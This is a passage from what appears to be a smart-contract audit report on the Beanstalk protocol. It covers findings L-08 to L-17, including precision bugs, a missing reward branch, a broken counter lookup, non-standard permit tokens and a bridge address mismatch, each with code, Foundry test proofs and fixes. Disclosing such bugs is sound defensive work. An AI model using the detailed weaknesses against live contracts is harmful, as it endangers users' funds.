    uint32 lastSowTime; //       │ 4  (20)
    uint32 thisSowTime; //       │ 4  (24)
@>  uint32 temp; // ─────────────┘ 4  (28/32)
    bytes32[4] _buffer;
}
```

At the moment of writing report current value of `s.sys.weather.temp` is 24028, you can check the site:
https://app.bean.money/#/field

So obviously this value exceeds max allowed in uint8 and cannot be set.

## Impact
Correct temperature cannot be configured during migration.

## Tools Used
Manual Review

## Recommendations
Define `initialTemperature` as uint32 in `ReseedField.init()` 
## <a id='L-08'></a>L-08. `ReseedBarn.init()` will run out of gas due to minting firtilizers on some L2s

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedBarn.sol#L47-L70

## Summary
`ReseedBarn.init()` deploys Fertilizer contract and mints Fertilizer ids to all the current holders during migration:
```solidity
    function init(
        Fertilizers[] calldata fertilizerIds,
        uint256 activeFertilizer,
        uint256 fertilizedIndex,
        uint256 unfertilizedIndex,
        uint128 bpf
    ) external {
        // deploy fertilizer implmentation.
        Fertilizer fertilizer = new Fertilizer();

        // deploy fertilizer proxy. Set owner to beanstalk.
@>      TransparentUpgradeableProxy fertilizerProxy = new TransparentUpgradeableProxy(
            address(fertilizer),
            address(this),
            abi.encode(IFertilizer.init.selector)
        );

@>      mintFertilizers(Fertilizer(address(fertilizerProxy)), fertilizerIds);
        ...
    }
```

All tokens must be minted in one transaction because it deploys Fertilizer contract.

I researched and found that at the moment of report writing there are 1101 unique entries owner-tokenId. [Gist with performed script](https://gist.github.com/T1MOH593/08a506fe9fb65feddc6377d7a80b3b46)

Here is analysis with gas consumption of function `mintFertilizers()`. It minted each of 100 FertilizerIds to 10 different owners, result is 33M gas.
https://gist.github.com/T1MOH593/024dda0357660dc366d62f25ee0caced

33M gas cannot be operated in some L2s, for example [Optimism stack has 30M gasLimit in block](https://docs.optimism.io/chain/differences#eip-1559-parameters), Polygon has 30M gasLimit too.

## Impact
Migration won't succeed on some L2s because all fertilizer ids cannot be minted in single transaction.

## Tools Used
Manual Review

## Recommendations
Refactor ReseedBarn to mint fertilizer ids in batches.
## <a id='L-09'></a>L-09. `LibWell.getBeanTokenPriceFromTwaReserves()` incorrectly assumes that token has 18 decimals

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Well/LibWell.sol#L248-L257

## Summary
Any Well LP can be whitelisted according to docs:
https://docs.bean.money/almanac/farm/sun#minting-whitelist

In case newly whitelisted Well has token with non 18 decimals, inner mechanism in core `sunrise()` function will break. That's because price calculation inside `LibWell.getBeanTokenPriceFromTwaReserves()` has hardcoded 1e18 for 18 decimals, however actual should be `10 ** ERC20(nonBeanToken).decimals()`.

## Vulnerability Details
There is long following callback chain:
```solidity
SeasonFacet.gm()
  Weather.calcCaseIdandUpdate()
    LibEvaluate.evaluateBeanstalk()
      LibEvaluate.updateAndGetBeanstalkState()
        LibEvaluate.calcLPToSupplyRatio()
      LibEvaluate.evalPrice()
        LibWell.getBeanTokenPriceFromTwaReserves()
```

Firstly, `LibEvaluate.calcLPToSupplyRatio()` calculates `largestLiqWell` which has 1e18 precision (because it's calculates via `LibWell.getWellTwaUsdLiquidityFromReserves` which has specifically 1e18 precision). Remember that it has 1e18 precision.
```solidity
    function calcLPToSupplyRatio(
        uint256 beanSupply
    )
        internal
        view
        returns (Decimal.D256 memory lpToSupplyRatio, address largestLiqWell, bool oracleFailure)
    {
    ...
            // if the liquidity is the largest, update `largestLiqWell`,
            // and add the liquidity to the total.
            // `largestLiqWell` is only used to initialize `s.sopWell` upon a sop,
            // but a hot storage load to skip the block below
            // is significantly more expensive than performing the logic on every sunrise.
            if (wellLiquidity > largestLiq) {
                largestLiq = wellLiquidity;
                largestLiqWell = pools[i];
            }
    ...
    }
```

Secondly, `LibWell.getBeanTokenPriceFromTwaReserves()` calculates Bean price according to reserves, returned price should be with 1e6 precision. However for example with reserves 500e6 USDC and 500e6 Bean it will return price 1e18 (instead of expected 1e6). Remember it for future steps.
```solidity
    function getBeanTokenPriceFromTwaReserves(address well) internal view returns (uint256 price) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // s.sys.twaReserve[well] should be set prior to this function being called.
        // 'price' is in terms of reserve0:reserve1.
        if (s.sys.twaReserves[well].reserve0 == 0 || s.sys.twaReserves[well].reserve1 == 0) {
            price = 0;
        } else {
            // fetch the bean index from the well in order to properly return the bean price.
            if (getBeanIndexFromWell(well) == 0) {
@>              price = uint256(s.sys.twaReserves[well].reserve0).mul(1e18).div(
                    s.sys.twaReserves[well].reserve1
                );
            } else {
@>              price = uint256(s.sys.twaReserves[well].reserve1).mul(1e18).div(
                    s.sys.twaReserves[well].reserve0
                );
            }
        }
    }
```

Finally, `evalPrice()` merges calculation from previous 2 steps to calculate `beanUsdPrice` and based on this performs important decisions regarding Bean peg mechanism further in flow. That is the place when miscalculation has impact:
```solidity
    function evalPrice(int256 deltaB, address well) internal view returns (uint256 caseId) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // p > 1
        if (deltaB > 0) {
            // Beanstalk will only use the largest liquidity well to compute the Bean price,
            // and thus will skip the p > EXCESSIVE_PRICE_THRESHOLD check if the well oracle fails to
            // compute a valid price this Season.
            // deltaB > 0 implies that address(well) != address(0).
            uint256 beanTknPrice = LibWell.getBeanTokenPriceFromTwaReserves(well);
            if (beanTknPrice > 1) {
@>              uint256 beanUsdPrice = uint256(1e30).div(
                    LibWell.getUsdTokenPriceForWell(well).mul(beanTknPrice)
                );
                if (beanUsdPrice > s.sys.seedGaugeSettings.excessivePriceThreshold) {
                    // p > excessivePriceThreshold
                    return caseId = 6;
                }
            }
            caseId = 3;
        }
        // p < 1
    }
```

It fetches cached price Token/Usd (it has 18 decimals), so overall calculation is `1e30 / (1e18 * 1e18) = 0`.
```solidity
    function getUsdTokenPriceForWell(address well) internal view returns (uint tokenUsd) {
        tokenUsd = LibAppStorage.diamondStorage().sys.usdTokenPrice[well];
    }
```


## Impact
Core peg mechanism becomes broken as soon as Well with non-18 decimals token is whitelisted. According to docs any Well can be whitelisted by governance, restrictions regarding decimals are not mentioned.

## Tools Used
Manual Review

## Recommendations
Do not harcode 1e18:
```diff
    function getBeanTokenPriceFromTwaReserves(address well) internal view returns (uint256 price) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // s.sys.twaReserve[well] should be set prior to this function being called.
        // 'price' is in terms of reserve0:reserve1.
        if (s.sys.twaReserves[well].reserve0 == 0 || s.sys.twaReserves[well].reserve1 == 0) {
            price = 0;
        } else {
            // fetch the bean index from the well in order to properly return the bean price.
            if (getBeanIndexFromWell(well) == 0) {
-               price = uint256(s.sys.twaReserves[well].reserve0).mul(1e18).div(
+               price = uint256(s.sys.twaReserves[well].reserve0).mul(10 ** ERC20(well.tokens[1]).decimals()).div(
                    s.sys.twaReserves[well].reserve1
                );
            } else {
-               price = uint256(s.sys.twaReserves[well].reserve1).mul(1e18).div(
+               price = uint256(s.sys.twaReserves[well].reserve1).mul(10 ** ERC20(well.tokens[0]).decimals()).div(
                    s.sys.twaReserves[well].reserve0
                );
            }
        }
    }
```
## <a id='L-10'></a>L-10. `LibWell.getWellTwaUsdLiquidityFromReserves()` returns liquidity with incorrect precision

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Well/LibWell.sol#L154

## Summary
Any Well can be whitelisted according to docs:
https://docs.bean.money/almanac/farm/sun#minting-whitelist

`LibWell.getWellTwaUsdLiquidityFromReserves()` uses uncached prices when is called from `SeasonGettersFacet.sol`. In this case it returns result with precision of nonBeanToken instead of expected 1e18. It becomes problem when token is non-18 decimals.

## Vulnerability Details
LibUsdOracle returns price with 1e6 precision, so this line just returns how much USD is in nonBeanToken reserve. Note that result has precision of token decimals:
```solidity
    function getWellTwaUsdLiquidityFromReserves(
        address well,
        uint256[] memory twaReserves
    ) internal view returns (uint256 usdLiquidity) {
        ...

        // if the function reaches here, then this is called outside the sunrise function
        // (i.e, seasonGetterFacet.getLiquidityToSupplyRatio()).We use LibUsdOracle
        // to get the price. This should never be reached during sunrise and thus
        // should not impact gas.
@>      return LibUsdOracle.getTokenPrice(token).mul(twaReserves[j]).div(1e6);
    }
```

Function is used in `LibEvaluate.calcLPToSupplyRatio()` to calculate nonBeanToken USD liquidity in all Wells. So for different tokens result has different precision, but they are all summed up:
```solidity
    function calcLPToSupplyRatio(
        uint256 beanSupply
    )
        internal
        view
        returns (Decimal.D256 memory lpToSupplyRatio, address largestLiqWell, bool oracleFailure)
    {
        ...
        for (uint256 i; i < pools.length; i++) {
            ...

            // calculate the non-bean usd liquidity value.
@>          uint256 usdLiquidity = LibWell.getWellTwaUsdLiquidityFromReserves(
                pools[i],
                twaReserves
            );

            ...

            // calculate the scaled, non-bean liquidity in the pool.
@>          wellLiquidity = getLiquidityWeight(pools[i]).mul(usdLiquidity).div(1e18);

            ...

@>          totalUsdLiquidity = totalUsdLiquidity.add(wellLiquidity);

            ...
        }

        ...

        // USD liquidity is scaled down from 1e18 to match Bean precision (1e6).
@>      lpToSupplyRatio = Decimal.ratio(totalUsdLiquidity.div(LIQUIDITY_PRECISION), beanSupply);
    }
```


## Impact
SeasonGettersFacet.sol will return incorrect values in case Well with non-18 decimals is whitelisted.

## Tools Used
Manual Review

## Recommendations
`getWellTwaUsdLiquidityFromReserves()` must return result with 1e18 precision, so add up to 18 in case token decimals is less.
## <a id='L-11'></a>L-11. `LibFertilizer.beginBarnRaiseMigration()` incorrectly checks that Oracle supports such token

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibFertilizer.sol#L224

## Summary
Here you can see it calls LibUsdOracle to ensure it supports token. However `LibUsdOracle.getTokenPrice()` returns 0 on failure instead of revert.
```solidity
    function beginBarnRaiseMigration(address well) internal {
        ...
        // Check that Lib Usd Oracle supports the non-Bean token in the Well.
@>      LibUsdOracle.getTokenPrice(address(tokens[tokens[0] == C.bean() ? 1 : 0]));

        ...
    }
```

## Impact
Well with unsupported token can be migrated by mistake because sanity check doesn't work.

## Tools Used
Manual Review

## Recommendations
```diff
        // Check that Lib Usd Oracle supports the non-Bean token in the Well.
-       LibUsdOracle.getTokenPrice(address(tokens[tokens[0] == C.bean() ? 1 : 0]));
+       require(LibUsdOracle.getTokenPrice(address(tokens[tokens[0] == C.bean() ? 1 : 0])) != 0)
```
## <a id='L-12'></a>L-12. SeasonGettersFacet returns the wrong totalDeltaB

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined). Selected submission by: [holydevoti0n](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-02-Beanstalk-1/blob/a3658861af8f5126224718af494d02352fbb3ea5/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonGettersFacet.sol#L90-L98

## Vulnerability Details

According to the docs the `totalDeltaB` should: `Returns the total Delta B across all whitelisted minting liquidity Wells`. 
But currently, it returns the deltaB from the C.BEAN_ETH_WELL pool.

```solidity
/**
     * @notice Returns the total Delta B across all whitelisted minting liquidity Wells.
     */
    function totalDeltaB() external view returns (int256 deltaB) {
        // @audit wrong token here. should be wseth, check whether it was submitted before.
        deltaB = LibWellMinting.check(C.BEAN_ETH_WELL);
    }
```

## Impact

- SeasonGettersFacet will never return the correct for the `totalDeltaB` leading any consumer of this function to show the incorrect price.

## Tools Used
Manual Review

## Recommendations
Include the `deltaB` from all the whitelisted liquidity wells.

```diff
function totalDeltaB() external view returns (int256 deltaB) {
-        deltaB = LibWellMinting.check(C.BEAN_ETH_WELL);
+       address[] memory tokens = LibWhitelistedTokens.getWhitelistedWellLpTokens();
+        for (uint256 i = 0; i < tokens.length; i++) {
+            deltaB = deltaB.add(LibWellMinting.check(tokens[i]));
+       }
    }
```
## <a id='L-13'></a>L-13. UsdOracle reverts on tokens which are not wstETH, WETH, Bean

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

UsdOracle.sol is ecosystem contract which is used to fetch the Usd price of Token. Problem is that it uses library LibUsdOracle.sol

LibUsdOracle.sol is meant to be used in Diamond's Facet because reads storage associated with oracle configuration per token. It reads storage on all tokens which are not wstETH, WETH, Bean. And obviously such straoge read is incorrect because UsdOracle.sol is standalone contract.

## Vulnerability Details

UsdOracle.sol has several functions to return Token : USD price by using LibUsdOracle.sol:

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/ecosystem/oracles/UsdOracle.sol#L14-L28>

LibUsdOracle uses function `getTokenPriceFromExternal()` on most of the tokens. This function reads storage like it's Diamond's Facet, obviously this function will revert because UsdOracle doesn't store Oracle config per Token:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L105>

```solidity
    function getTokenPriceFromExternal(
        address token,
        uint256 lookback
    ) internal view returns (uint256 tokenPrice) {
        AppStorage storage s = LibAppStorage.diamondStorage();
@>      Implementation memory oracleImpl = s.sys.oracleImplementation[token];
        ...
    }
```

## Impact

UsdOracle doesn't work with some tokens.

## Tools Used

Manual Review

## Recommendations

Write custom library to use in UsdOracle.sol

## <a id='L-14'></a>L-14. TractorFacet return the wrong values for Tractor Counter

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/farm/TractorFacet.sol#L130-L156

## Summary
TractorFacet will always return the wrong value for `getCounter` and `updateCounter` functions. But those can only work while running through a Blueprint call(while the activePublisher is set). This will prevent users to make external calls to the `TractorFacet` and consult their data related to the Tractor counter.

This issue occurs because the protocol is trying to fetch the `activePublisher` from `tractorStorage()` which has the address set to `1` and this address only changes when the `activePublisher` is set inside the `runBlueprint` modifier. 

Note that those functions are `external` and should return the correct value when the `msg.sender` matches the address of the publisher for that `counterId`. 

```solidity
    function getCounter(bytes32 counterId) public view returns (uint256 count) {
        return
            LibTractor._tractorStorage().blueprintCounters[
@>                LibTractor._tractorStorage().activePublisher // @audit current address is 1
            ][counterId];
    }


    /**
     * @notice Update counter value.
     * @return count New value of counter
     */
    function updateCounter(
        bytes32 counterId,
        LibTractor.CounterUpdateType updateType,
        uint256 amount
    ) external returns (uint256 count) {
        uint256 newCount;
        if (updateType == LibTractor.CounterUpdateType.INCREASE) {
            newCount = getCounter(counterId).add(amount);
        } else if (updateType == LibTractor.CounterUpdateType.DECREASE) {
            newCount = getCounter(counterId).sub(amount);
        }
        LibTractor._tractorStorage().blueprintCounters[
@>            LibTractor._tractorStorage().activePublisher // @audit current address is 1
        ][counterId] = newCount;
        return newCount;
    }
```



## Impact

- Users will not be able to update their Blueprint's counter as the `updateCounter` will set the `counterId` and its value to the `address(1)`
- Users will not be able to fetch their Blueprint's counter value as the `getCounter` will try to fetch the value from the `address(1)`

## PoC

Add the following functions to `TractorFacet` to facilitate the testing and then add `TractorFacet` to `BeanstalkDeployer`. 

```solidity
 // TractorFacet
 function setPublisher(address payable publisher) external {
        LibTractor._setPublisher(publisher);
    }
 function resetPublisher() external {
        LibTractor._resetPublisher();
    }
```

```diff
// BeanstalkDeployer
string[] facets = [
...
+ "TractorFacet" 
]
```

Now replace all the code on `Tractor.t.sol` with the following: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

 import "forge-std/Test.sol";

 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

 import {C} from "contracts/C.sol";
 import {LibAppStorage} from "contracts/libraries/LibAppStorage.sol";
 import {LibTractor} from "contracts/libraries/LibTractor.sol";
 import {IBeanstalk} from "contracts/interfaces/IBeanstalk.sol";
 import {TokenFacet} from "contracts/beanstalk/farm/TokenFacet.sol";
 import {TractorFacet} from "contracts/beanstalk/farm/TractorFacet.sol";
 import {TestHelper} from "test/foundry/utils/TestHelper.sol";
 import {LibTransfer} from "contracts/libraries/Token/LibTransfer.sol";
 import {LibClipboard} from "contracts/libraries/LibClipboard.sol";
 import {AdvancedFarmCall} from "contracts/libraries/LibFarm.sol";
 import {LibBytes} from "contracts/libraries/LibBytes.sol";


 contract TractorTest is TestHelper {
    IBeanstalk beanstalk;
    IERC20 bean;

    TractorFacet tractorFacet;
    TokenFacet tokenFacet;

    function setUp() public {
        initializeBeanstalkTestState(true, false);

        beanstalk = IBeanstalk(BEANSTALK);
        bean = IERC20(C.BEAN);
        tokenFacet = TokenFacet(BEANSTALK);
        tractorFacet = TractorFacet(BEANSTALK);
    }

    function testTractor_whenCallingGetCounter_willReturnWrongCounter() public {
        // pre conditions - set counterId. 
        bytes32 counterId = keccak256(abi.encodePacked("counterId"));
        _setPublisherWith(counterId);

        // action:  get the counter value - should return 500
        uint256 newValue = tractorFacet.getCounter(counterId);
        assertEq(newValue, 500);
    }

    function _setPublisherWith(bytes32 counterId) internal {
        tractorFacet.setPublisher(payable(address(this)));

        // set a new value for the counterId
        tractorFacet.updateCounter(counterId, LibTractor.CounterUpdateType.INCREASE, 500);
        uint256 value = tractorFacet.getCounter(counterId);
        assertEq(value, 500);

        // reset publisher - Beanstalk default state
        tractorFacet.resetPublisher();
    }
 }
```

Run: `forge test --match-test testTractor_whenCallingGetCounter_willReturnWrongCounter -vv` 

Output: 

```
Ran 1 test for test/foundry/tractor/Tractor.t.sol:TractorTest
[FAIL. Reason: assertion failed: 0 != 500] testTractor_whenCallingGetCounter_willReturnWrongCounter() (gas: 56703)
```

## Tools Used
Manual Review and Foundry

## Recommendations

Replace `LibTractor._tractorStorage().activePublisher` with `LibTractor._user()`. 

This works for both cases: active publisher set and `msg.sender`.

✅ Test with the fix:

```
[PASS] testTractor_whenCallingGetCounter_willReturnWrongCounter() (gas: 52451)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 248.29ms (444.13µs CPU time)
```
## <a id='L-15'></a>L-15. Zero reward due to a missing scaling factor

_Submitted by [pacelli](https://profiles.cyfrin.io/u/undefined), [emmac002](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [RiaZul](https://profiles.cyfrin.io/u/undefined). Selected submission by: [emmac002](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When a caller triggers `seasonfacet:gm` or `seasonfacet:sunrise`, according to the comment 'gm advances Beanstalk to the next Season and sends reward Beans to a specified address or the caller'. The calculation of the reward is based on the blocks late and a formula in `LibIncentive:fracExp`, however there is a missing scaling factor (secondsLate <= 240) in fracExp which causes an unintended reduction of incentive to 0.

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibIncentive.sol#L440-L444>

## Vulnerability Details

Step 1: A caller triggers `seasonfacet:gm` and gm returns incentive at the end of the function.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L61>

```Solidity
    function gm(
        address account,
        LibTransfer.To mode
    ) public payable fundsSafu noOutFlow returns (uint256) {
        require(!s.sys.paused, "Season: Paused.");
        require(seasonTime() > s.sys.season.current, "Season: Still current Season.");
        uint32 season = stepSeason();
        int256 deltaB = stepOracle();
        uint256 caseId = calcCaseIdandUpdate(deltaB);
        LibGerminate.endTotalGermination(season, LibWhitelistedTokens.getWhitelistedTokens());
        LibGauge.stepGauge();
        stepSun(deltaB, caseId);

    @>    return incentivize(account, mode);
    }
```

Step 2: The `LibIncentive:determineReward` calculates the incentive Amount.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L104>

```Solidity
    function incentivize(address account, LibTransfer.To mode) private returns (uint256) {
        uint256 secondsLate = block.timestamp.sub(
            s.sys.season.start.add(s.sys.season.period.mul(s.sys.season.current))
        );

        // reset USD Token prices and TWA reserves in storage for all whitelisted Well LP Tokens.
        address[] memory whitelistedWells = LibWhitelistedTokens.getWhitelistedWellLpTokens();
        for (uint256 i; i < whitelistedWells.length; i++) {
            LibWell.resetUsdTokenPriceForWell(whitelistedWells[i]);
            LibWell.resetTwaReservesForWell(whitelistedWells[i]);
        }

        @> uint256 incentiveAmount = LibIncentive.determineReward(secondsLate);

        LibTransfer.mintToken(C.bean(), incentiveAmount, account, mode);

        emit LibIncentive.Incentivization(account, incentiveAmount);
        return incentiveAmount;
    }
```

Step 3: The `LibIncentive:determineReward` triggers `LibIncentive:fracExp`, a function which scales the reward up as the number of blocks after expected sunrise increases.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibIncentive.sol#L52>

```Solidity
    function determineReward(uint256 secondsLate) external pure returns (uint256) {
        // Cap the maximum number of blocks late. If the sunrise is later than
        // this, Beanstalk will pay the same amount. Prevents unbounded return value.
        if (secondsLate > MAX_SECONDS_LATE) {
            secondsLate = MAX_SECONDS_LATE;
        }

        // Scale the reward up as the number of blocks after expected sunrise increases.
        // `sunriseReward * (1 + 1/100)^(blocks late * seconds per block)`
        // NOTE: 1.01^(25 * 12) = 19.78, This is the maximum multiplier.
        @> return fracExp(BASE_REWARD, secondsLate);
    }
```

Step 4: The comment in `LibIncentive:fracExp` states that 'Checked every 2 seconds to reduce bytecode size.' However, 240 secondsLate is missing between 238 and 242, which causes an unintended reduction of incentive to 0.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibIncentive.sol#L440-L444>

```Solidity
            if (secondsLate <= 238) {
                return _scaleReward(beans, 10_677_927);
            }
            @audit here
        } else if (secondsLate <= 270) {
            if (secondsLate <= 242) {
                return _scaleReward(beans, 11_111_494);
            }
```

## POC

Test:

```Solidity
    function testfracExp239_240() public {

        uint256 scaledSunriseReward238 = LibIncentive.fracExp(BASE_REWARD, 238);
        uint256 scaledSunriseReward239 = LibIncentive.fracExp(BASE_REWARD, 239);
        uint256 scaledSunriseReward240 = LibIncentive.fracExp(BASE_REWARD, 240);
        uint256 scaledSunriseReward242 = LibIncentive.fracExp(BASE_REWARD, 242);
        uint256 scaledSunriseReward244 = LibIncentive.fracExp(BASE_REWARD, 244);


        console.log("scaledSunriseReward238:", scaledSunriseReward238);
        console.log("scaledSunriseReward239:", scaledSunriseReward239);
        console.log("scaledSunriseReward240:", scaledSunriseReward240);
        console.log("scaledSunriseReward242:", scaledSunriseReward242);
        console.log("scaledSunriseReward244:", scaledSunriseReward244);
    }
```

Result:

```Solidity
Logs:
  scaledSunriseReward238: 53389635
  scaledSunriseReward239: 0
  scaledSunriseReward240: 0
  scaledSunriseReward242: 55557470
  scaledSunriseReward244: 56674175
```

## Impact

The caller or specified address will not receive any reward or 0 reward minted due to a technical flaw, which may lead to a lack of incentives for user participation.

## Tools Used

Manual review & Foundry

## Recommendations

Add secondsLate <= 240

## <a id='L-16'></a>L-16. Permit functions will not work with certain tokens

_Submitted by [dimah7](https://profiles.cyfrin.io/u/undefined), [Merklemore](https://profiles.cyfrin.io/u/undefined), [Bube](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Merklemore](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The protocol aims to work with all ERC20 tokens which are accepted in farm contracts, based on the information provided in the [readme](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/README.md#compatibilities), however, the permit functions will not work with certain tokens like DAI, which do not follow the EIP2612 standard.

## Vulnerability Details

From TokenFacet.sol and TokenSupportFacet.sol , the permit functions can be seem which is intended to allow users to access the permit functionalities of the tokens they'd like to approve. The problem is that the function signature provided doesn't account for tokens with [Dai like permit signature](https://github.com/yashnaman/tokensWithPermitFunctionList/blob/master/hasDAILikePermitFunctionTokenList.json) which features a nonce in addition to the other parameters.

In  TokenFacet.sol, `permitToken` calls `LibTokenPermit.permit` using the owner, spender, token, value, deadline, v, r, s parameters.

```solidity
    function permitToken(
        address owner,
        address spender,
        address token,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable fundsSafu noNetFlow noSupplyChange nonReentrant {
        LibTokenPermit.permit(owner, spender, token, value, deadline, v, r, s);
        LibTokenApprove.approve(owner, spender, IERC20(token), value);
    }
```

The same can be observed In TokenSupportFacet.sol, in which the token's permit function is queried using then owner, spender, value, deadline, v, r, s parameters.

```solidity
    function permitERC20(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public payable fundsSafu noNetFlow noSupplyChange {
        token.permit(owner, spender, value, deadline, v, r, s);
    }
```

However, Dai and its equivalents have a permit function that looks like this.

```solidity
    function permit(address holder, address spender, uint256 nonce, uint256 expiry,
                    bool allowed, uint8 v, bytes32 r, bytes32 s) external
    {
```

This means that due to the missing nonce field, DAI, a token that allows permit based interactions, cannot be used with signed messages as the permit transactions will revert.

Some tokens also have [phantom permits](https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f), WETH for example, which do not revert on call to the permit function even though the tokens lack the `permit` function, which can lead to malicious approvals on behalf of the token owners.

## Impact

Unexpected behaviour due to tokens with non standard permits, including failures and phantom approvals.

## Tools Used

Manual Code Review, [Reference](https://solodit.xyz/issues/mint-with-permit-can-be-broken-when-using-tokens-that-do-not-follow-the-erc2612-standard-halborn-none-moonwell-finance-contracts-v2-updates-security-assessment-pdf)

## Recommendations

Consider introducing a different implementation of the permit functions which allows a nonce variable. An implementation like that of [Uniswap Permit2](https://github.com/Uniswap/permit2) may also help.

## <a id='L-17'></a>L-17. Mismatch in the `BRIDGE` address between the `BeanL1RecieverFacet` and `BeanL2MigrationFacet` contracts prevents the migration of Beans to L2

_Submitted by [Bauchibred](https://profiles.cyfrin.io/u/undefined), [whitehat777](https://profiles.cyfrin.io/u/undefined). Selected submission by: [whitehat777](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L37

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L24

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L34-L37

## Summary

Mismatch in the `BRIDGE` address between the `BeanL1RecieverFacet` and `BeanL2MigrationFacet` contracts prevents the migration of Beans to L2. This discrepancy causes the `require` statement in `BeanL1RecieverFacet` to always revert, blocking the migration functionality.

## Vulnerability Details

This vulnerability occurs because in the `recieveL1Beans` function of the `BeanL1RecieverFacet` contract. The following `require` statement always will revert due to mismatch in the `BRIDGE` address between the `BeanL1RecieverFacet` and `BeanL2MigrationFacet` contracts:

[BeanL1RecieverFacet.sol#L34-L37](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L34-L37)
```solidity
require(msg.sender == address(BRIDGE) && IL2Messenger(BRIDGE).xDomainMessageSender() == L1BEANSTALK);
```

### Detailed explanation  
The `BRIDGE` address in `BeanL1RecieverFacet` is set to 0x4200000000000000000000000000000000000007 [here](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L24). However, in the `BeanL2MigrationFacet` contract, the `BRIDGE` address is set to 0x866E82a600A1414e583f7F13623F1aC5d58b0Afa [here](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L37). Hence, this address mismatch causes the require statement to always revert because the `msg.sender` will never match the expected `BRIDGE` address in `BeanL1RecieverFacet`. 

### Context: 
The `BeanL2MigrationFacet` uses the `IBeanL1RecieverFacet.recieveL1Beans` function to migrate Beans from Beanstalk on L1 to L2. Due to the mismatch between the `BRIDGE` address constants in the two contracts, the migration process cannot be completed. Since Beans are a fundamental asset within the Beanstalk ecosystem, used for various critical functions, the inability to migrate them to L2 severely impacts the functionality and growth of the project. Therefore, this issue is marked as a high severity issue.

### PoC for occuring of the issue:  
```solidity 
contract BeanL2MigrationFacet is Invariable, ReentrancyGuard {
>>>  address constant BRIDGE = address(0x866E82a600A1414e583f7F13623F1aC5d58b0Afa);

    /**
     * @notice migrates `amount` of Beans to L2,
     * issued to `reciever`.
     */
    function migrateL2Beans(address reciever, address L2Beanstalk, uint256 amount, uint32 gasLimit)
        external
        nonReentrant
    {
        C.bean().burnFrom(msg.sender, amount);

        // send data to
>>>     IL2Bridge(BRIDGE).sendMessage(
